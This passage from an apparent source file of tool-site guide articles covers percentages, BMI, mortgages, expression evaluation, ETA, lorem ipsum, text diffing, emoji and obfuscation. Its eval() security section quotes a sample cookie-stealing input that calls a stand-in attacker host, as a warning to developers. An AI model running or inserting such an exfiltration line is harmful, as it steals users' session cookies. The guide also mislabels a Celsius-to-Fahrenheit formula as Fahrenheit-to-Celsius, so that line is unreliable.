Total = 30 / (15 / 100) = 30 * (100/15) = 200
\`\`\`

### Formula 4: Percentage Change
\`\`\`
% Change = ((New - Old) / Old) * 100

Example: Price went from $80 to $100
% Change = ((100 - 80) / 80) * 100 = 25% increase

Example: Score went from 90 to 72
% Change = ((72 - 90) / 90) * 100 = -20% (decrease)
\`\`\`

## Common Percentage Scenarios

### Discounts and Sales
\`\`\`
Original price: $120
Discount: 30%
Sale price = $120 * (1 - 0.30) = $120 * 0.70 = $84
You save: $120 * 0.30 = $36
\`\`\`

### Tax Calculation
\`\`\`
Pretax amount: $50
Tax rate: 8.5%
Tax amount = $50 * 0.085 = $4.25
Total = $50 + $4.25 = $54.25
\`\`\`

### Tips
\`\`\`
Bill: $75
Tip: 18%
Tip amount = $75 * 0.18 = $13.50
Total with tip = $75 + $13.50 = $88.50
\`\`\`

### Grade/Score Percentage
\`\`\`
Points earned: 87
Points possible: 100
Percentage = (87 / 100) * 100 = 87%

Points earned: 42
Points possible: 60
Percentage = (42 / 60) * 100 = 70%
\`\`\`

### Compound Interest
\`\`\`
Principal: $1,000
Annual rate: 5%
After 3 years (compound):
Year 1: $1,000 * 1.05 = $1,050
Year 2: $1,050 * 1.05 = $1,102.50
Year 3: $1,102.50 * 1.05 = $1,157.63

Formula: A = P * (1 + r)^n
A = 1000 * (1.05)^3 = $1,157.63
\`\`\`

## Percentage vs Percentage Points

This distinction matters in statistics and finance:

- **Percentage point**: An arithmetic difference between two percentages.
- **Percentage**: A relative change.

If approval rating goes from 40% to 44%:
- The increase is **4 percentage points** (arithmetic difference).
- The increase is **10%** (relative: 4/40 * 100 = 10%).

This distinction is crucial in financial reporting and political polling.

## Mental Math Shortcuts

- **10%**: Move decimal point one place left (500 * 10% = 50)
- **5%**: Half of 10% (500 * 5% = 25)
- **1%**: Move decimal point two places left (500 * 1% = 5)
- **20%**: Twice the 10% value (500 * 20% = 100)
- **25%**: Divide by 4 (500 * 25% = 125)
- **50%**: Divide by 2 (500 * 50% = 250)
- **75%**: 50% + 25% (500 * 75% = 375)

-> Try the [Percentage Calculator](/percentage-calculator)`,
  },
  {
    slug: 'bmi-calculator-guide',
    toolPath: '/bmi-calculator',
    title: 'BMI Calculator: What Your Body Mass Index Means',
    description: 'Calculate your BMI and understand health categories. Learn about BMI limitations and better health metrics.',
    keywords: ['BMI calculator', 'body mass index', 'healthy weight', 'BMI chart', 'overweight BMI'],
    category: 'Math',
    publishedAt: '2025-07-26',
    content: `## What Is BMI?

BMI (Body Mass Index) is a numerical value calculated from a person's height and weight. It is a simple screening tool used by healthcare providers worldwide to categorize weight status and identify potential health risks. BMI was developed by Belgian mathematician Adolphe Quetelet in the 1830s and has been used clinically since the 1970s.

## The BMI Formula

\`\`\`
BMI = weight (kg) / height (m)^2

Imperial formula:
BMI = (weight (lbs) / height (inches)^2) * 703
\`\`\`

Examples:
\`\`\`
Person: 70 kg, 1.75 m tall
BMI = 70 / (1.75)^2 = 70 / 3.0625 = 22.9

Person: 154 lbs, 5'9" (69 inches) tall
BMI = (154 / 69^2) * 703 = (154 / 4761) * 703 = 22.7
\`\`\`

## BMI Categories (WHO)

| BMI Range | Category | Health Risk |
|---|---|---|
| Below 18.5 | Underweight | Possible nutritional deficiency, osteoporosis |
| 18.5 - 24.9 | Normal weight | Low health risk |
| 25.0 - 29.9 | Overweight | Moderate health risk |
| 30.0 - 34.9 | Obesity Class I | High health risk |
| 35.0 - 39.9 | Obesity Class II | Very high health risk |
| 40.0 and above | Obesity Class III | Extremely high health risk |

## BMI for Different Populations

### Adults (20+)
The standard WHO categories above apply. The same cutoffs apply to both men and women.

### Children and Teenagers (2-19)
BMI is interpreted differently for young people. Instead of fixed cutoffs, BMI percentile for age and sex is used:
- Below 5th percentile: Underweight
- 5th to below 85th percentile: Healthy weight
- 85th to below 95th percentile: Overweight
- 95th percentile and above: Obese

### Asian Populations
Research suggests that Asian populations have higher health risks at lower BMI values. Some health organizations use modified cutoffs:
- Overweight: BMI 23.0 and above
- Obese: BMI 27.5 and above

### Elderly (65+)
A slightly higher BMI (22-27) may be protective in older adults. Low BMI in elderly is associated with greater mortality risk than in younger adults.

## Limitations of BMI

BMI is a useful population-level screening tool but has significant limitations for individual assessment:

**Does not measure body fat directly**: A muscular athlete may have a high BMI (classified as overweight) while having low body fat. Conversely, a "normal" BMI person may have high body fat percentage.

**Doesn't account for fat distribution**: Visceral fat (around organs) is more dangerous than subcutaneous fat (under skin). Waist circumference is a better predictor of metabolic risk.

**Gender differences**: Women typically have more body fat than men at the same BMI.

**Ethnic variations**: Different ethnic groups have different relationships between BMI and health risks.

**Age variations**: Body composition changes with age even if BMI stays the same.

## Better Alternatives to BMI

For a more complete picture of health:

- **Waist circumference**: Risk threshold >88cm (35") for women, >102cm (40") for men
- **Waist-to-height ratio**: Waist circumference / Height. Values >0.5 indicate increased risk
- **Body fat percentage**: Measured by DEXA scan, hydrostatic weighing, or bioimpedance
- **Waist-to-hip ratio**: Measures fat distribution pattern

Despite its limitations, BMI remains the most widely used weight screening tool due to its simplicity and availability.

## Using This Tool

Enter your height and weight to instantly calculate your BMI and see where it falls in the standard categories. You can switch between metric (kg/cm) and imperial (lbs/inches) units.

-> Try the [BMI Calculator](/bmi-calculator)`,
  },
  {
    slug: 'mortgage-calculator-guide',
    toolPath: '/mortgage-calculator',
    title: 'Mortgage Calculator: Monthly Payments and Amortization Explained',
    description: 'Calculate mortgage payments and see your full amortization schedule. Understand how mortgage math works.',
    keywords: ['mortgage calculator', 'monthly payment calculator', 'amortization schedule', 'home loan calculator'],
    category: 'Math',
    publishedAt: '2025-07-27',
    content: `## Understanding Mortgage Calculations

A mortgage is a loan used to purchase real estate, where the property itself serves as collateral. The borrower repays the loan in regular installments over a set term (typically 15-30 years). Understanding how mortgage payments are calculated helps borrowers make informed decisions about home purchases.

## The Mortgage Payment Formula

Monthly payment uses the amortization formula:

\`\`\`
M = P * [r(1+r)^n] / [(1+r)^n - 1]

Where:
M = Monthly payment
P = Principal (loan amount)
r = Monthly interest rate (annual rate / 12)
n = Total number of payments (years * 12)
\`\`\`

Example: $300,000 loan at 7% annual rate for 30 years:
\`\`\`
P = 300,000
r = 0.07 / 12 = 0.005833
n = 30 * 12 = 360

M = 300,000 * [0.005833 * (1.005833)^360] / [(1.005833)^360 - 1]
M = 300,000 * [0.005833 * 8.116] / [8.116 - 1]
M = 300,000 * [0.04734] / [7.116]
M = $1,996 per month
\`\`\`

## Components of a Mortgage Payment (PITI)

Monthly mortgage payments typically include four components:

**Principal**: The portion that reduces your loan balance.

**Interest**: The cost of borrowing money. In early years, most of each payment is interest.

**Taxes**: Property taxes, usually collected by the lender and paid from an escrow account.

**Insurance**: Homeowner's insurance (and PMI if down payment is less than 20%).

## Amortization: How Payments Split Between Principal and Interest

In an amortizing mortgage, each payment's split between principal and interest changes over time:

\`\`\`
$300,000 loan, 7% rate, 30 years, $1,996/month payment

Payment 1:   Interest = $1,750   Principal = $246    Balance = $299,754
Payment 12:  Interest = $1,738   Principal = $258    Balance = $296,893
Payment 60:  Interest = $1,667   Principal = $329    Balance = $285,720
Payment 180: Interest = $1,428   Principal = $568    Balance = $244,140
Payment 300: Interest = $741     Principal = $1,255  Balance = $125,952
Payment 360: Interest = $12      Principal = $1,984  Balance = $0
\`\`\`

In the early years, the vast majority of your payment is interest. This is why building home equity is slow initially.

## Total Interest Paid

\`\`\`
$300,000 loan at 7% for 30 years:
Total payments = $1,996 * 360 = $718,560
Total interest paid = $718,560 - $300,000 = $418,560

Same loan at 30 years vs 15 years:
30-year payment: $1,996/month  Total interest: $418,560
15-year payment: $2,696/month  Total interest: $185,280
Savings: $233,280 (by paying $700/month more)
\`\`\`

## Key Factors Affecting Mortgage Cost

### Interest Rate
The single biggest factor. Even a small rate difference has large impact over 30 years:

| Rate | Monthly Payment | Total Interest (30yr, $300k) |
|---|---|---|
| 5.0% | $1,610 | $279,600 |
| 6.0% | $1,799 | $347,640 |
| 7.0% | $1,996 | $418,560 |
| 8.0% | $2,201 | $492,360 |

### Loan Term
Shorter terms mean higher monthly payments but much less total interest.

### Down Payment
Larger down payment means smaller loan, lower monthly payment, and avoidance of PMI (Private Mortgage Insurance, required when down payment is below 20%).

## Down Payment and PMI

PMI (Private Mortgage Insurance) protects the lender if you default. It typically costs 0.5%-1.5% of the loan amount annually (added to monthly payment) until you reach 20% equity.

Example: $300,000 home with 5% down:
- Loan: $285,000
- PMI rate: 0.8%/year
- Monthly PMI: $285,000 * 0.008 / 12 = $190/month extra

PMI is automatically removed once you reach 22% equity based on original value (in the US under the Homeowners Protection Act).

## Fixed vs. Adjustable Rate

**Fixed-rate mortgage**: Interest rate stays the same for the entire loan term. Predictable payments, protection against rising rates.

**Adjustable-rate mortgage (ARM)**: Rate is fixed for an initial period (5, 7, or 10 years), then adjusts annually based on a market index. Usually starts lower than fixed rates but carries rate risk.

## Using This Tool

Enter your loan amount, interest rate, and term to instantly see your monthly payment, total interest paid, and a complete amortization schedule showing how your balance decreases over time.

-> Try the [Mortgage Calculator](/mortgage-calculator)`,
  },
  {
    slug: 'math-evaluator-guide',
    toolPath: '/math-evaluator',
    title: 'Math Expression Evaluator: Calculate Complex Formulas Online',
    description: 'Evaluate mathematical expressions, use variables, and compute scientific functions in your browser.',
    keywords: ['math evaluator', 'math calculator', 'expression calculator', 'scientific calculator online', 'formula evaluator'],
    category: 'Math',
    publishedAt: '2025-07-28',
    content: `## What Is a Math Expression Evaluator?

A **math expression evaluator** (or math parser) takes a mathematical expression as text input and computes its numeric result. Rather than a simple calculator with buttons, an expression evaluator accepts free-form mathematical notation: \`(3 + 4) * 2\`, \`sin(pi/4)\`, \`2^10\`, or complex formulas combining arithmetic, functions, and constants.

This is more powerful than a button calculator for:
- Complex multi-operator expressions
- Scientific and engineering calculations
- Quick formula testing
- Educational exploration of math

## Expression Syntax

A math evaluator supports a richer syntax than simple arithmetic:

### Basic Arithmetic
- Addition: \`3 + 4\` → 7
- Subtraction: \`10 - 3.5\` → 6.5
- Multiplication: \`6 * 7\` → 42
- Division: \`15 / 4\` → 3.75
- Integer division: \`15 // 4\` → 3 (floor division)
- Modulo: \`17 % 5\` → 2
- Exponentiation: \`2^10\` or \`2**10\` → 1024

### Order of Operations (PEMDAS/BODMAS)
Standard mathematical operator precedence:
1. Parentheses first: \`(3 + 4) * 2\` → 14
2. Exponents: \`2^3 + 1\` → 9
3. Multiplication/Division (left to right): \`6 / 2 * 3\` → 9
4. Addition/Subtraction (left to right): \`10 - 3 + 2\` → 9

### Mathematical Functions
- Trigonometry: \`sin(x)\`, \`cos(x)\`, \`tan(x)\`, \`asin(x)\`, \`acos(x)\`, \`atan(x)\`
- Hyperbolic: \`sinh(x)\`, \`cosh(x)\`, \`tanh(x)\`
- Logarithms: \`log(x)\` (natural log), \`log10(x)\` (base-10), \`log2(x)\`
- Powers/Roots: \`sqrt(x)\`, \`cbrt(x)\`, \`pow(x, y)\`
- Rounding: \`floor(x)\`, \`ceil(x)\`, \`round(x)\`
- Absolute value: \`abs(x)\`

### Mathematical Constants
- \`pi\` or \`π\` → 3.14159265358979...
- \`e\` (Euler's number) → 2.71828182845904...
- \`phi\` (Golden ratio) → 1.61803398874989...
- \`inf\` → Infinity
- \`tau\` → 2π = 6.28318...

### Example Expressions
\`\`\`
2^32 - 1          → 4294967295 (max uint32)
sqrt(144)         → 12
sin(pi/2)         → 1
log(e)            → 1
(1 + sqrt(5)) / 2 → 1.618... (golden ratio)
factorial(10)     → 3628800
ceil(4.3)         → 5
abs(-42)          → 42
\`\`\`

## Floating-Point Precision

Computer arithmetic uses IEEE 754 floating-point representation, which can produce surprising results:

\`\`\`
0.1 + 0.2 = 0.30000000000000004
\`\`\`

This is not a bug but a fundamental property of binary floating-point representation. Decimal fractions like 0.1 cannot be represented exactly in binary, just as 1/3 cannot be represented exactly in decimal.

For financial calculations, specialized decimal libraries are needed. For scientific work, the precision (about 15-16 significant decimal digits for 64-bit floats) is usually sufficient.

## Symbolic vs. Numeric Evaluation

A basic math evaluator performs **numeric evaluation** — it computes a single numeric result from specific values.

More advanced **computer algebra systems** (CAS) perform **symbolic evaluation** — they manipulate mathematical expressions algebraically:
- \`d/dx (x^2)\` → \`2x\` (differentiation)
- \`integrate(2x, x)\` → \`x^2 + C\` (integration)
- \`solve(x^2 - 4, x)\` → \`x = 2, x = -2\` (equation solving)
- \`expand((x+1)^3)\` → \`x^3 + 3x^2 + 3x + 1\` (expansion)

Systems like Wolfram Alpha, Mathematica, SymPy (Python), and Matlab offer symbolic computation. Browser-based numeric evaluators are simpler but sufficient for most practical needs.

## Safe Expression Parsing

Parsing user-provided mathematical expressions requires care:

### Never Use eval()
The JavaScript \`eval()\` function executes arbitrary code, creating serious security vulnerabilities if user input is passed directly. An attacker could enter \`fetch('attacker.com?data='+document.cookie)\`.

### Use a Math Parser Library
Safe alternatives use dedicated parsing libraries like math.js, expr-eval, or mathjs that only evaluate mathematical expressions:
\`\`\`javascript
const math = require('mathjs');
const result = math.evaluate('2 + 3 * 4'); // Safe: 14
\`\`\`

## Practical Applications

- **Quick calculations**: Faster than opening a calculator app
- **Formula testing**: Test mathematical formulas before coding them
- **Unit conversion**: \`32 * 9/5 + 32\` for Fahrenheit to Celsius
- **Engineering**: Complex equations with scientific notation
- **Finance**: Compound interest, loan calculations, percentages
- **Education**: Exploring mathematical concepts interactively

## Using the Math Evaluator Tool

Our tool:
1. **Enter any expression** — full mathematical notation supported
2. **Instant evaluation** — real-time computation as you type
3. **History** — review previous calculations
4. **Function reference** — see all supported functions and constants
5. **Scientific notation** — displays very large and very small numbers appropriately
6. **Copy result** — one-click copy of the computed value

The evaluator safely parses expressions without using eval(), supporting the full range of mathematical operations and functions.
`,
  },
  {
    slug: 'eta-calculator-guide',
    toolPath: '/eta-calculator',
    title: 'ETA Calculator: Estimate Completion Time for Any Task',
    description: 'Calculate estimated time of arrival or completion based on progress rate. Perfect for downloads, processes, and projects.',
    keywords: ['ETA calculator', 'estimated time', 'completion time calculator', 'time remaining', 'progress calculator'],
    category: 'Math',
    publishedAt: '2025-07-29',
    content: `## What Is an ETA Calculator?

ETA (Estimated Time of Arrival) refers to the predicted time when a person, vehicle, or process will arrive at a destination or complete a task. An ETA calculator computes this arrival time based on the current time, distance, and speed, or based on work completed and remaining.

## Travel ETA Calculation

The basic formula for travel time:

\`\`\`
Travel Time = Distance / Speed
Arrival Time = Departure Time + Travel Time
\`\`\`

Examples:
\`\`\`
Distance: 250 miles, Speed: 65 mph
Travel time = 250 / 65 = 3.85 hours = 3 hours 51 minutes
If departure is 9:00 AM, ETA = 12:51 PM

Distance: 480 km, Speed: 120 km/h
Travel time = 480 / 120 = 4 hours
\`\`\`

## Progress-Based ETA (Task Completion)

For ongoing tasks, ETA can be estimated from the completion rate:

\`\`\`
Elapsed Time = Current Time - Start Time
Progress = Items Done / Total Items
Rate = Items Done / Elapsed Time
Remaining = Total Items - Items Done
Time Left = Remaining / Rate
ETA = Current Time + Time Left
\`\`\`

Example:
\`\`\`
Started: 2:00 PM
Current time: 2:30 PM (30 minutes elapsed)
Items done: 150 out of 500 total
Rate = 150 / 30 = 5 items per minute
Remaining = 500 - 150 = 350 items
Time left = 350 / 5 = 70 minutes
ETA = 2:30 PM + 70 min = 3:40 PM
\`\`\`

## Progress Percentage and Remaining Time

\`\`\`
Percent complete = (Items Done / Total) * 100
Percent remaining = 100 - Percent complete

Time for 1%: Elapsed Time / Percent Complete
Total time estimate: Time for 1% * 100
Time remaining: Total estimate - Elapsed time
\`\`\`

## ETA in Software Development

In programming contexts, ETA calculators are used for:

**File downloads and uploads**: Show users how long a transfer will take based on current transfer rate.

**Data processing jobs**: Estimate when a database migration or data pipeline will complete.

**Build systems**: Show estimated completion time for CI/CD pipelines.

**Progress bars**: Display estimated time remaining alongside visual progress.

\`\`\`javascript
// Simple ETA calculation in JavaScript
function calculateETA(total, done, startTime) {
  const now = Date.now();
  const elapsed = (now - startTime) / 1000; // seconds
  const rate = done / elapsed; // items per second
  const remaining = total - done;
  const timeLeft = remaining / rate; // seconds
  const eta = new Date(now + timeLeft * 1000);
  
  return {
    percentComplete: (done / total * 100).toFixed(1),
    timeRemainingSeconds: timeLeft,
    eta: eta.toLocaleTimeString()
  };
}
\`\`\`

## Factors Affecting ETA Accuracy

### Variable Speed
Travel ETAs assume constant speed, but real travel involves acceleration, deceleration, traffic, stops, and rest breaks. Navigation apps use real-time traffic data to improve accuracy.

### Variable Processing Rate
Task ETAs assume constant processing rate, but rates can change over time (processing faster as caches warm up, slower as disk fills up, etc.). Exponential moving averages can smooth out rate fluctuations.

### Unknown Unknowns
Detours, accidents, task complications, and system failures are unpredictable. Build buffer time into ETAs for critical deadlines.

## Real-World ETA Applications

Navigation systems (Google Maps, Waze) combine historical traffic patterns, real-time data, and machine learning to predict travel time with reasonable accuracy.

Package tracking systems calculate estimated delivery based on the package's current location and standard transit times between facilities.

Construction and project management tools use earned value management (EVM) to project completion dates based on work performed versus planned.

## Using This Tool

Enter your departure time, distance, and average speed (or current progress and completion rate) to instantly calculate your estimated arrival or completion time. The tool handles unit conversions and time zone calculations automatically.

-> Try the [ETA Calculator](/eta-calculator)`,
  },

  // ─── Text ─────────────────────────────────────────────────────
  {
    slug: 'lorem-ipsum-guide',
    toolPath: '/lorem-ipsum-generator',
    title: 'Lorem Ipsum: History, Uses, and How to Generate the Right Amount',
    description: 'Learn about Lorem Ipsum placeholder text — its history, when to use it, and how to generate words, sentences, or paragraphs.',
    keywords: ['lorem ipsum generator', 'placeholder text', 'dummy text', 'lorem ipsum online', 'filler text'],
    category: 'Text',
    publishedAt: '2025-07-30',
    content: `## What Is Lorem Ipsum?

Lorem ipsum is placeholder text commonly used in graphic design, publishing, and web development to fill space before the final content is available. It allows designers and developers to focus on visual layout without being distracted by readable content.

The standard lorem ipsum text begins: "Lorem ipsum dolor sit amet, consectetur adipiscing elit..." and has been used as dummy text in typesetting since the 1500s.

## The Origin of Lorem Ipsum

Lorem ipsum comes from Cicero's philosophical work "De Finibus Bonorum et Malorum" (On the Ends of Good and Evil), written in 45 BC. The original Latin passage reads:

"Neque porro quisquam est qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit..."

Translation: "Nor is there anyone who loves or pursues or desires to obtain pain of itself, because it is pain, but occasionally circumstances occur in which toil and pain can procure some great pleasure..."

The lorem ipsum version is a scrambled, altered version of this text. Richard McClintock, a Latin professor at Hampden-Sydney College, traced the origin in 1994 and confirmed it dates back to Cicero. The text became popularized in the 1960s when Letraset published sheets of lorem ipsum for dry-transfer lettering.

## Why Use Lorem Ipsum?

### Prevents Content Distraction
Human brains are wired to read text, not analyze layout. When reviewing a design, readable content draws attention to what it says rather than how it looks. Lorem ipsum lets viewers evaluate typography, whitespace, and visual hierarchy without getting caught up in content.

### Provides Realistic Text Length
"This is placeholder text" doesn't approximate realistic paragraph lengths. Lorem ipsum generates natural-looking blocks of text that simulate real content density.

### Universal Convention
Lorem ipsum is universally recognized as placeholder text. Seeing it signals to stakeholders that content is not finalized, preventing premature feedback on wording.

## Alternative Placeholder Text Options

### Cupcake Ipsum
Food-themed placeholder text: "Cupcake ipsum dolor sit amet. Sesame snaps chocolate bar cake pastry..."
Good for food-related projects or when clients need something lighter than Latin.

### Corporate Ipsum
Business jargon filler: "Leverage agile frameworks to provide robust synopses for high level overviews..."
Useful for corporate and business applications.

### Hipster Ipsum  
Trendy placeholder text: "Artisan before they sold out vice, vinyl butcher brooklyn..."
For creative and lifestyle brands.

### Blind Text
Pure visual placeholder without the Latin appearance, useful when clients might be confused by Lorem ipsum.

### Actual Content
For user research and final design reviews, real content (even draft content) is always better than placeholder text.

## Generating Lorem Ipsum Programmatically

\`\`\`python
# Using the lorem package in Python
import lorem

# Generate a paragraph
paragraph = lorem.paragraph()

# Generate a sentence
sentence = lorem.sentence()

# Generate n words
words = lorem.words(10)
\`\`\`

\`\`\`javascript
// Using lorem-ipsum npm package
const LoremIpsum = require('lorem-ipsum').LoremIpsum;
const lorem = new LoremIpsum({
  wordsPerSentence: { max: 16, min: 4 },
  sentencesPerParagraph: { max: 8, min: 4 }
});

const text = lorem.generateParagraphs(3);
\`\`\`

## Standard Lorem Ipsum Paragraphs

\`\`\`
Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.

Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
\`\`\`

## Using This Tool

Choose the number of paragraphs, sentences, or words you need. Select options like whether to start with "Lorem ipsum" and the language style (classical Latin, modern Lorem ipsum variants). Copy the generated text with one click.

-> Try the [Lorem Ipsum Generator](/lorem-ipsum-generator)`,
  },
  {
    slug: 'text-diff-guide',
    toolPath: '/text-diff',
    title: 'Text Diff Tool: How to Compare Two Texts and Find Differences',
    description: 'Compare two texts side-by-side and highlight every difference. Learn about diff algorithms and practical applications.',
    keywords: ['text diff', 'compare text', 'text comparison', 'find differences', 'diff tool online'],
    category: 'Text',
    publishedAt: '2025-07-31',
    content: `## What Is Text Diffing?

Text diffing (differencing) is the process of comparing two versions of text to identify what has changed between them. The term comes from the Unix \`diff\` command, which has been a fundamental developer tool since 1974.

Text diff is used in version control systems (git diff), code review tools, wiki pages, document collaboration, and any context where tracking changes over time matters.

## How Diff Algorithms Work

### The Longest Common Subsequence (LCS)

The foundation of most diff algorithms is finding the Longest Common Subsequence (LCS) - the longest sequence of elements that appear in both texts in the same relative order (but not necessarily contiguous).

For two strings "ABCDE" and "ACBDE":
- LCS is "ABDE" (length 4)
- The diff shows: A is same, C is inserted, B is same, C is deleted, D and E are same

### Myers Diff Algorithm

The Myers diff algorithm (1986), used by Git and many other tools, efficiently finds the shortest edit script (minimum number of insertions and deletions) to transform one text into another. It runs in O(ND) time where N is text length and D is the number of differences.

### Word-Level vs. Line-Level vs. Character-Level

Different granularities serve different purposes:

**Line-level diff**: Standard for source code (shows entire modified lines). Best for code review.

**Word-level diff**: Shows which specific words changed within a line. Better for prose editing.

**Character-level diff**: Shows exact characters that changed. Best for detecting typos or small modifications.

## Unified Diff Format

The standard unified diff format (used by \`git diff\`):

\`\`\`diff
--- a/original.txt
+++ b/modified.txt
@@ -10,7 +10,8 @@
 Context line (unchanged)
 Context line (unchanged)
-Deleted line
+New replacement line
+Another added line
 Context line (unchanged)
\`\`\`

Line indicators:
- \` \` (space): Unchanged context line
- \`-\`: Removed in new version
- \`+\`: Added in new version
- \`@@\`: Hunk header showing line numbers

## Three-Way Merge

When merging changes from two branches, a three-way merge compares:
1. The original base version
2. Version A (your changes)
3. Version B (their changes)

Changes are classified as:
- **Non-conflicting**: Only one side modified the text - automatically merged
- **Conflicting**: Both sides modified the same area - requires manual resolution

Git marks conflicts like:
\`\`\`
<<<<<<< HEAD
Your version of the code
=======
Their version of the code
>>>>>>> feature-branch
\`\`\`

## Practical Applications

### Code Review
Before merging a pull request, developers review the diff to understand what changed, why, and whether there are any issues.

### Documentation
Wikis and document management systems (Confluence, Google Docs revision history) show diffs between versions.

### Configuration Management
Infrastructure teams diff configuration files before deploying changes to production.

### Legal and Academic
Contract amendments and paper revisions track exactly what changed between versions.

## Using Diff Tools

**Command line:**
\`\`\`bash
diff original.txt modified.txt
diff -u original.txt modified.txt  # Unified format
git diff HEAD~1                    # Changes since last commit
git diff main feature-branch       # Between branches
\`\`\`

**Code editors:** VS Code, Sublime, IntelliJ all have built-in diff viewers.

**Online tools:** For quick comparisons without installing software.

## Using This Tool

Paste two versions of text in the left and right panels. The tool highlights additions (green), deletions (red), and unchanged text with configurable comparison modes (characters, words, or lines).

-> Try the [Text Diff Tool](/text-diff)`,
  },
  {
    slug: 'emoji-picker-guide',
    toolPath: '/emoji-picker',
    title: 'Emoji Picker: Find and Copy Any Emoji Instantly',
    description: 'Browse, search, and copy emojis from all Unicode categories. Learn emoji Unicode codes and how to use them in code.',
    keywords: ['emoji picker', 'emoji search', 'copy emoji', 'emoji unicode', 'emoji keyboard'],
    category: 'Text',
    publishedAt: '2025-08-01',
    content: `## The Universal Language of Emoji

Emoji have evolved from simple emoticons into a sophisticated visual communication system used by billions of people daily. With over 3,600 emoji in the Unicode standard as of 2024, finding the right one quickly requires a powerful picker tool.

## A Brief History of Emoji

The first emoji were created in 1999 by Shigetaka Kurita for NTT DoCoMo's mobile internet platform in Japan. The original set contained just 176 symbols in a 12x12 pixel grid. Apple included emoji support in iOS 2.2 in 2008, and the Unicode Consortium began standardizing them in 2010.

Today, emoji are officially part of Unicode, which means they work consistently across all modern operating systems, though rendering styles differ between platforms.

## How Emoji Work Technically

Emoji are Unicode characters represented as code points:
- Smiling face: U+1F600
- Red heart: U+2764 U+FE0F (with variation selector)
- Family emoji: Multiple code points joined by Zero Width Joiners (ZWJ)

### Skin Tone Modifiers
Five skin tone modifiers can be combined with many human emoji to represent different Fitzpatrick scale skin tones, enabling more inclusive representation.

### Multi-Person Emoji (ZWJ Sequences)
Family emoji like the family group are actually sequences of individual emoji joined by invisible Zero Width Joiner characters (U+200D), allowing flexible combinations of people and relationships.

## Emoji Categories

The Unicode standard organizes emoji into 10 groups: Smileys and People, Animals and Nature, Food and Drink, Travel and Places, Activities, Objects, Symbols, Flags, and additional extras. Each category is regularly expanded with new additions.

## Platform Rendering Differences

The same emoji can look very different across platforms:
- **Apple**: Detailed, three-dimensional style with shadows
- **Google/Android**: Flat, colorful, clean design
- **Microsoft**: Newer flat design (older versions had the "blob" style)
- **Twitter/X**: Custom designs that sometimes diverge significantly

This matters for cross-platform communication — emoji meaning can shift based on how they render for the recipient.

## Using Emoji Effectively

### Marketing and Social Media
- Posts with emoji get 25% more engagement on average
- Use emoji at the beginning of sentences to draw attention
- Include relevant emoji in email subject lines
- Don't overuse — one or two per sentence maximum

### Accessibility Considerations
Screen readers announce emoji by their Unicode name. Best practices:
- Avoid strings of multiple emoji
- Don't use emoji as the only way to convey meaning
- Add \`aria-hidden="true"\` when emoji are purely decorative

### In Code and Technical Writing
Use Unicode escape sequences or HTML entities when emoji might cause encoding issues:
- HTML: \`&#x1F600;\`
- JavaScript: \`'\\u{1F600}'\`
- Python: \`'\\U0001F600'\`
- CSS: \`\\1F600\`

## Emoji in URLs and Databases

Emoji in URLs should be percent-encoded. When storing emoji in databases, ensure your character set supports 4-byte UTF-8 encoding (MySQL's \`utf8mb4\` charset, for example — the standard \`utf8\` encoding won't work for emoji).

## Using the Emoji Picker Tool

Our emoji picker provides:

1. **Search by name** — Type "heart," "fire," or any keyword to find emoji instantly
2. **Browse by category** — Navigate through organized groups
3. **Recent emoji** — Quick access to your most-used emoji
4. **Copy to clipboard** — One-click copying in various formats
5. **Copy as Unicode** — Get the U+XXXXX code point
6. **Copy as HTML entity** — Get the HTML entity form for HTML use

## New Emoji Additions

The Unicode Consortium reviews emoji proposals annually. New emoji are added each year, reflecting cultural moments, medical conditions, professions, and diversity more comprehensively.

Organizations and companies can submit emoji proposals at unicode.org. The approval process typically takes 2-3 years from submission to widespread device support.

Emoji continue to evolve as our communication needs change — from simple smiley faces to a rich visual vocabulary that transcends language barriers worldwide.
`,
  },
  {
    slug: 'string-obfuscator-guide',
    toolPath: '/string-obfuscator',
    title: 'String Obfuscation: What It Is and When to Use It',
    description: 'Obfuscate strings to hide sensitive data in UI, emails, or code. Learn the difference between obfuscation and encryption.',
    keywords: ['string obfuscator', 'obfuscate text', 'hide string', 'text obfuscation', 'data masking'],
    category: 'Text',
    publishedAt: '2025-08-02',
    content: `## What Is String Obfuscation?

String obfuscation is the process of making text harder to read or understand while preserving its core meaning or functionality. Unlike encryption (which completely hides data), obfuscation obscures information in ways that are often still technically readable but practically confusing. This technique has legitimate uses in privacy masking, code protection, puzzle design, and anti-spam measures.

## Common Obfuscation Techniques

### Character Substitution
Replace characters with visually similar alternatives. Leet speak replaces letters with numbers (H3ll0 W0rld). Homoglyphs use characters from other Unicode scripts that look identical to Latin letters but have different code points — a technique used both creatively and maliciously.

### Caesar Cipher and ROT13
Shift each letter by N positions in the alphabet. ROT13 shifts by 13 positions, making it its own inverse — applying it twice returns the original text. Popular for hiding puzzle spoilers and text that shouldn't be immediately readable.

### Base64 Encoding
Not encryption, but makes text unreadable at a glance. Converts binary data to a 64-character alphabet. A common misconception is that Base64 provides security — it provides no security whatsoever, only superficial obscurity.

### Binary and Hex Representation
Convert text to binary (01001000 for 'H') or hexadecimal (0x48 for 'H'). Used in technical contexts to represent text at the byte level, and sometimes in CTF (Capture the Flag) security challenges.

### HTML Entity Encoding
Convert characters to their HTML entity equivalents. Primarily used for preventing HTML injection, but can be used for obfuscation — an email address encoded as HTML entities is unreadable to naive scrapers.

## Purpose of String Obfuscation

### Code Obfuscation
JavaScript minifiers and obfuscators make code hard to reverse engineer. Software vendors use obfuscation to protect intellectual property in client-side code. Variable names become meaningless single characters, string literals are encoded, and control flow is artificially complicated.

### Anti-Spam Email Protection
Email addresses on websites are often obfuscated to prevent scraping by bots. Displaying "user [at] example [dot] com" or encoding the address as HTML entities makes it unreadable to simple text extractors while remaining understandable to human readers.

### Privacy Masking
Partially hiding sensitive information for display purposes:
- Credit cards: shown as **** **** **** 4242
- Phone numbers: (555) ***-7890
- Email addresses: j***@example.com
- Social Security Numbers: ***-**-1234

This is standard practice in customer service interfaces, receipts, and user account pages.

### Puzzle Design
Escape rooms, treasure hunts, ARGs (Alternate Reality Games), and coding challenges use obfuscation as a puzzle element. Participants must recognize and reverse the transformation to find the hidden message.

## Obfuscation vs Encryption

